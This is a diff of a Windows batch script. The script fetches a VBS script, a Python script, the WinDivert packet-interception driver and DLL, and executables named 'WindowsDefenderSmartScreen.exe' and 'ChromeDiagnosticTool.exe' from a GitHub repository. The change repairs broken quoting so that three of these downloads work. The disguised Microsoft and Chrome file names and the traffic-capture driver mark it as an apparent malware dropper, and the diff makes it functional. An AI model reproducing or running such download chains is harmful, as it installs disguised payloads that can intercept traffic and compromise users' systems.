@@ -19,10 +19,11 @@ curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/as
 curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/ddd.vbs" -o "%FILE1%"
 curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/by.py" -o "%FILE4%"
 curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/WindowsDefenderSmartScreen.exe" -o "%FILE3%"
-curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/WinDivert64.sys -o "%FILE5%"
-curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/WinDivert.dll -o "%FILE6%"
-curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/ChromeDiagnosticTool.exe -o "%FILE7%"
+curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/WinDivert64.sys" -o "%FILE5%"
+curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/WinDivert.dll" -o "%FILE6%"
+curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/ChromeDiagnosticTool.exe" -o "%FILE7%"
 
 exit
+
 
 
